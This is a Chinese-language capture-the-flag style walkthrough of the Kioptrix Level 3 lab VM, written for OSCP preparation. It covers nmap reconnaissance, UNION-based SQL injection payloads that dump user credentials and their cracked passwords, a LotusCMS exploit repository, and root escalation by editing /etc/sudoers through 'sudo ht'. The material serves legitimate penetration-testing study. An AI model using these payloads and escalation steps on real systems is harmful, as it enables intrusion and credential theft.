# kioptix level 3靶机getshell及提权(按oscp考证要求使用)-先知社区

> **来源**: https://xz.aliyun.com/news/16311  
> **文章ID**: 16311

---

> 声明！  
> 文章所提到的网站以及内容，只做学习交流，其他均与本人无关，切勿触碰法律底线，否则后果自负！！！

# 一、靶机搭建

点击扫描虚拟机

![](images/20241225144425-ae5c4f5c-c28b-1.png)

选择靶机使在文件夹即可

![](images/20241225144427-afd73b26-c28b-1.png)

# 二、信息收集

## 前言

信息收集阶段，因为这里是靶机，所以不需要做什么，但是实际渗透测试中，大家一定要学会正确的**隐藏自己的个人信息**

扫完ip后即可得到以下信息

> kali：192.168.108.130
>
> 目标ip：192.168.108.137

## 扫ip

```
nmap -sn 192.168.108.0/24
```

排除已知的，这个则是**靶机ip**

![](images/20241225144429-b094e3ec-c28b-1.png)

## 扫端口和服务信息

```
nmap -p 1-65535 192.168.108.137
nmap -sV 192.168.108.137
```

![](images/20241225144430-b185f03e-c28b-1.png)

可用信息

> OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
>
> Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)

## 指纹探测

```
nmap 192.168.108.137 -p 22,80 -sV -sC -O --version-all
```

得到以下信息

![](images/20241225144433-b36a19e8-c28b-1.png)

操作系统信息：

```
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
```

# 三、踩点或预探测

## 1.访问web服务

有以下页面

![](images/20241225153431-ade47e94-c292-1.png)

有登录框，可能存在漏洞，尝试弱口令无果

![](images/20241225153513-c6ee352e-c292-1.png)

有个页面不可正常访问，可能是DNS缓存的问题，去设置一下

## 2. 设置域名解析

### 1. windows环境下

首先如果浏览器访问过该网站，需要找到**浏览器缓存**，这里我使用的火狐浏览器，点击管理数据

![](images/20241225152113-d26e7488-c290-1.png)

找到刚才的网站，删除缓存

![](images/20241225145143-b3c62214-c28c-1.png)

在下面的目录下，选择**host**属性

```
C:\Windows\System32\drivers\etc
```

设置权限

![](images/20241225152115-d3850686-c290-1.png)

设置之后在记事本编辑，设置如下，**靶机ip 域名**

![](images/20241225152119-d5fe2300-c290-1.png)

然后刷新缓存即可

![](images/20241225152121-d77ac9f4-c290-1.png)

### 2. linu环境下设置

```
sudo vim /ets/hosts
```

输入以下保存即可

```
靶机ip kioptrix3.com
```

全部完成之后这个页面即可正常访问

![](images/20241225152125-d99b71f4-c290-1.png)

## 3. 找出可利用点

#### sql注入

逐个点击之后发现此处存在**id**参数

![](images/20241225145715-794d136c-c28d-1.png)

尝试利用

![](images/20241225145717-7a6de81e-c28d-1.png)

测试**id=2**;**id=1'**，发现报错，应该存在**sql注入**漏洞

![](images/20241225152126-da7a7ac8-c290-1.png)

#### LotusCMS漏洞

```
searchsploit LotusCMS
```

第一个需要利用msfconsle，这里我们用第二个

![](images/20241225145837-aa8cc40c-c28d-1.png)

github上搜索

![](images/20241225152128-db7fdd3a-c290-1.png)  
复制以下链接

```
https://github.com/Hood3dRob1n/LotusCMS-Exploit.git
```

执行

```
git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit.git/
```

拉取成功

![](images/20241225150022-e8bafcb4-c28d-1.png)

利用脚本

![](images/20241225150028-eca5ea3a-c28d-1.png)

# 四、采取攻击措施

数据库爆破常用参数

![](images/20241225150031-ee3fda92-c28d-1.png)

## 爆列数

```
?id=1 order by 7--
```

![](images/20241225150032-ee8d1106-c28d-1.png)

## 爆行数

```
?id=2 union select 1,2,3,4,5,6--
```

![](images/20241225150033-ef476612-c28d-1.png)

## 爆数据库

```
?id=2 union select 1,database(),3,4,5,6--
```

得到数据库名： **gallery**  
![](images/20241225152129-dc33b118-c290-1.png)

## 爆表

```
?id=2  union select 1,group_concat(table_name),3,4,5,6 from information_schema.columns where table_schema=database()--
```

结果

![](images/20241225152131-dd29f758-c290-1.png)

## 爆元素

```
?id=2 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_schema=database() and table_name='dev_accounts'--
```

逐个查询表中元素，在第一个表中看到以下信息

![](images/20241225152133-de4f29c8-c290-1.png)

## 查看此内容

```
?id=2 union select 1,group_concat(username),group_concat(password),4,5,6 from dev_accounts--
```

加密的MD5值：

> 用户名：dreg,loneferret
>
> 密码：0d3eccfb887aabd50f243b3f155c0f8,5badcaf789d3d1d09794d8f021f40f0e

![](images/20241225152134-df3513d4-c290-1.png)

[MD5解密网站](https://www.cmd5.com/)

```
用户名：dreg,loneferret
密码：Mast3r,starwars
```

## 登录

有两中方法，一种利用shell，一种直接在靶机登录

登录成功

![](images/20241225150600-b2917874-c28e-1.png)

# 五、提权

## 靶机

![](images/20241225150603-b42801ba-c28e-1.png)

试试另外一个账户，输入**exit**退出登录

![](images/20241225150605-b5728998-c28e-1.png)

可以看到有**checksec.sh**，**CompanyPolicy.README**这两个文件

做到这一步就没有什么头绪了，换另一种方式也没用，这个时候需要删除虚拟机，重新导入

```
cat CompanyPolicy.README
sudo ht
```

![](images/20241225150757-f7cba248-c28e-1.png)

重新导入后执行**sudo ht** 结果如下，按**F3**搜索，并输入**etc/sudoers**

![](images/20241225150905-2088678c-c28f-1.png)

此处添加/bin/bash,按F10保存并退出

![](images/20241225151022-4e647d6e-c28f-1.png)

提权成功

![](images/20241225152136-dff5a934-c290-1.png)

## kali执行shell连接

![](images/20241225152137-e0a14b52-c290-1.png)

看到需要加密算法，这里我利用了gpt找到了解决办法，实际考试是不允许的，所以平时学习遇到的新一定要熟练掌握

![](images/20241225151419-dbfb20d8-c28f-1.png)

利用代码：

```
ssh -o HostKeyAlgorithms=+ssh-rsa loneferret@192.168.108.137
```

成功登录

![](images/20241225151421-dd2189e8-c28f-1.png)

```
sudo ht
```

发现需要添加环境变量

![](images/20241225151423-dde353c0-c28f-1.png)

添加环境变量

```
export TERM=xterm
```

再次执行 **sudo ht**,后面的步骤则和之前一样
